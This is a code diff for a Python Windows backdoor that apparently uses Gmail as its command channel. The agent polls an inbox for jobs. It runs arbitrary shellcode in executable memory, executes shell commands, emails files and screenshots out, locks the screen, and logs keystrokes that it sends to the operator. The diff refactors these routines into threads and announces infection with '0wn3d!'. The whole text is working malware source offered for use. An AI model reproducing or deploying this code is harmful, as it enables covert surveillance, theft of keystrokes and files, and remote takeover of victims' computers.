@@ -23,7 +23,7 @@ import pyHook
 import win32security
 
 from PIL import ImageGrab
-from traceback import print_exc
+from traceback import print_exc, format_exc
 from ntsecuritycon import *
 from win32com.shell import shell
 from smtplib import SMTP
@@ -50,6 +50,18 @@ logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="
 
 #generates a unique uuid 
 uniqueid = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))
+
+def genRandomString(slen=10):
+    return ''.join(random.sample(string.ascii_letters + string.digits, slen))
+
+def isAdmin():
+    return shell.IsUserAnAdmin()
+
+def getSysinfo():
+    return '{}-{}'.format(platform.platform(), os.environ['PROCESSOR_ARCHITECTURE'])
+
+def detectForgroundWindow():
+    return win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
 class msgparser:
 
@@ -113,11 +125,17 @@ class keylogger(threading.Thread):
     def onKeyboardEvent(self, event):
         char = chr(event.Ascii)
         if event.Ascii != 0 or 8:
-            logging.debug("[keylogger] key: {} key_buffer: {}".format(char, len(self.key_buffer)))
+            try:
+                logging.debug("[keylogger] key: {} key_buffer: {}".format(char, len(self.key_buffer)))
+            except:
+                pass
             self.key_buffer += char
         
         if event.Ascii == 13:
-            logging.debug("[keylogger] key: {} key_buffer: {}".format(char, len(self.key_buffer)))
+            try:
+                logging.debug("[keylogger] key: {} key_buffer: {}".format(char, len(self.key_buffer)))
+            except:
+                pass
             self.key_buffer += char
 
         if len(self.key_buffer) is 100:
@@ -125,92 +143,97 @@ class keylogger(threading.Thread):
             sendEmail({'CMD': 'keylogger', 'RES': self.key_buffer}, jobid=self.jobid)
             self.key_buffer = ''
 
+class lockScreen(threading.Thread):
 
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
 
-def genRandomString(slen=10):
-    return ''.join(random.sample(string.ascii_letters + string.digits, slen))
+        self.setDaemon(True)
+        self.start()
 
-def isAdmin():
-    return shell.IsUserAnAdmin()
-
-def getSysinfo():
-    return '{}-{}'.format(platform.platform(), os.environ['PROCESSOR_ARCHITECTURE'])
-
-def detectForgroundWindow():
-    return win32gui.GetWindowText(win32gui.GetForegroundWindow())
-
-def lockWorkstation(jobid):
-    try:
-        ctypes.windll.user32.LockWorkStation()
-        sendEmail({'CMD': 'lockscreen', 'RES': 'Success'}, jobid=jobid)
-    except Exception as e:
-        if verbose == True: print print_exc()
-
-def download(file, jobid):
-    if os.path.exists(file) == True:
+    def run(self):
         try:
-            SendEmail('Downloaded file ' + str(file), file)
-        except Exception, e:
+            ctypes.windll.user32.LockWorkStation()
+            sendEmail({'CMD': 'lockscreen', 'RES': 'Success'}, jobid=self.jobid)
+        except Exception as e:
             if verbose == True: print print_exc()
-            SendEmail('Download Failed: ' + str(e))
+
+class screenshot(threading.Thread):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+
+        self.setDaemon(True)
+        self.start()
+
+    def run(self):
+        try:
+            img=ImageGrab.grab()
+            saveas= os.path.join(os.getenv('TEMP'), genRandomString() + '.png')
+            img.save(saveas)
+            sendEmail({'CMD': 'screenshot', 'RES': 'Screenshot taken'}, jobid=self.jobid, attachment=[saveas])
+            #os.remove(saveas)
+        except Exception as e:
+            if verbose == True: print_exc()
             pass
 
-def upload(file, jobid):
-    raise NotImplementedError
+class execShellcode(threading.Thread):
 
-def screenshot(jobid):
-    try:
+    def __init__(self, shellc, jobid):
+        threading.Thread.__init__(self)
+        self.shellc = shellc
+        self.jobid = jobid
 
-        screen_dir = os.getenv('TEMP')
+        self.setDaemon(True)
+        self.start()
 
-        img=ImageGrab.grab()
-        saveas= os.path.join(screen_dir, genRandomString() + '.png')
-        img.save(saveas)
-        sendEmail({'CMD': 'screenshot', 'RES': 'Screenshot taken'}, jobid=jobid, attachment=[saveas])
-        os.remove(saveas)
+    def run(self):
+        try:
+            shellcode = bytearray(self.shellc)
 
-    except Exception as e:
-        if verbose == True: print_exc()
-        pass
-
-def execShellcode(shellc):
-    try:
-        shellcode = bytearray(shellc)
-
-        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
-                                                  ctypes.c_int(len(shellcode)), 
-                                                  ctypes.c_int(0x3000), 
-                                                  ctypes.c_int(0x40))
-    
-        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-    
-        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), 
-                                             buf, 
-                                             ctypes.c_int(len(shellcode))) 
+            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
+                                                      ctypes.c_int(len(shellcode)), 
+                                                      ctypes.c_int(0x3000), 
+                                                      ctypes.c_int(0x40))
         
-        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-                                                 ctypes.c_int(0),
-                                                 ctypes.c_int(ptr),
-                                                 ctypes.c_int(0),
-                                                 ctypes.c_int(0),
-                                                 ctypes.pointer(ctypes.c_int(0)))
+            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
         
-        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) 
+            
+            ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                                     ctypes.c_int(0),
+                                                     ctypes.c_int(ptr),
+                                                     ctypes.c_int(0),
+                                                     ctypes.c_int(0),
+                                                     ctypes.pointer(ctypes.c_int(0)))
+            
+            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
-    except Exception as e:
-        if verbose == True: print_exc()
-        
+        except Exception as e:
+            if verbose == True: print_exc()
 
-def execCmd(command, jobid):
-    try:
-        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        stdout_value = proc.stdout.read()
-        stdout_value += proc.stderr.read()
+class execCmd(threading.Thread):
 
-        sendEmail({'CMD': command, 'RES': stdout_value}, jobid=jobid)
-    except Exception as e:
-        if verbose == True: print_exc()
-        pass
+    def __init__(self, command, jobid):
+        threading.Thread.__init__(self)
+        self.command = command
+        self.jobid = jobid
+
+        self.setDaemon(True)
+        self.start()
+
+    def run(self):
+        try:
+            proc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            stdout_value = proc.stdout.read()
+            stdout_value += proc.stderr.read()
+
+            sendEmail({'CMD': self.command, 'RES': stdout_value}, jobid=self.jobid)
+        except Exception as e:
+            if verbose == True: print_exc()
+            pass
 
 class sendEmail(threading.Thread):
 
@@ -271,65 +294,63 @@ def checkJobs():
             c.login(gmail_user, gmail_pwd)
             c.select("INBOX")
 
-            typ, id_list_single = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:{}')".format(uniqueid))
-            typ, id_list_all = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:ALL')")
+            typ, id_list = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:{}')".format(uniqueid))
 
-            for id_list in [id_list_single, id_list_all]:
+            for msg_id in id_list[0].split():
+                
+                logging.debug("[checkJobs] parsing message with uid: {}".format(msg_id))
+                
+                msg_data = c.uid('fetch', msg_id, '(RFC822)')
+                msg = msgparser(msg_data)
+                jobid = msg.subject.split(':')[2]
+                
+                if msg.dict:
+                    cmd = msg.dict['CMD'].lower()
+                    arg = msg.dict['ARG']
 
-                for msg_id in id_list[0].split():
+                    logging.debug("[checkJobs] CMD: {} JOBID: {}".format(cmd, jobid))
 
-                    msg_data = c.uid('fetch', msg_id, '(RFC822)')
-                    msg = msgparser(msg_data)
-                    jobid = msg.subject.split(':')[2]
+                    if cmd == 'execshellcode':
+                        execShellcode(arg, jobid)
+
+                    elif cmd == 'download':
+                        try:
+                            if os.path.exists(arg) is True:
+                                SendEmail({'CMD': 'download', 'RES': 'Success'}, jobid, [arg])
+                        except Exception as e:
+                            SendEmail({'CMD': 'download', 'RES': 'Failed: {}'.format(e)}, jobid)
+
+                    elif cmd == 'screenshot':
+                        screenshot(jobid)
                     
-                    if msg.dict:
-                        t = None
-                        cmd = msg.dict['CMD'].lower()
-                        arg = msg.dict['ARG']
+                    elif cmd == 'cmd':
+                        execCmd(arg, jobid)
 
-                        logging.debug("[checkJobs] CMD: {} JOBID: {}".format(cmd, jobid))
+                    elif cmd == 'lockscreen':
+                        lockScreen(jobid)
 
-                        if cmd == 'execshellcode':
-                            t = threading.Thread(name='execshell', target=execShellcode, args=(arg,jobid))
-                        
-                        elif cmd == 'download':
-                            t = threading.Thread(name='download', target=download, args=(arg,jobid))
-                        
-                        elif cmd == 'screenshot':
-                            t = threading.Thread(name='screenshot', target=screenshot, args=(jobid,))
-                        
-                        elif cmd == 'cmd':
-                            t = threading.Thread(name='execCmd', target=execCmd, args=(arg,jobid,))
+                    elif cmd == 'startkeylogger':
+                        keylogger.getInstance(jobid).start()
 
-                        elif cmd == 'lockscreen':
-                            t = threading.Thread(name='lockWorkstation', target=lockWorkstation, args=(jobid,))
+                    elif cmd == 'stopkeylogger':
+                        keylogger.getInstance(jobid).stop()
 
-                        elif cmd == 'startkeylogger':
-                            keylogger.getInstance(jobid).start()
+                    elif cmd == 'forcecheckin':
+                        sendEmail("Host checking in as requested", checkin=True)
 
-                        elif cmd == 'stopkeylogger':
-                            keylogger.getInstance(jobid).stop()
-
-                        elif cmd == 'forcecheckin':
-                            sendEmail("Host checking in as requested", checkin=True)
-
-                        else:
-                            raise NotImplementedError
-
-                        if t:
-                            t.setDaemon(True)
-                            t.start()
+                    else:
+                        raise NotImplementedError
 
             c.logout()
 
             time.sleep(10)
         
         except Exception as e:
-            logging.debug(print_exc())
+            logging.debug(format_exc())
             time.sleep(10)
 
 if __name__ == '__main__':
-    sendEmail("Host checking in", checkin=True)
+    sendEmail("0wn3d!", checkin=True)
     try:
         checkJobs()
     except KeyboardInterrupt:
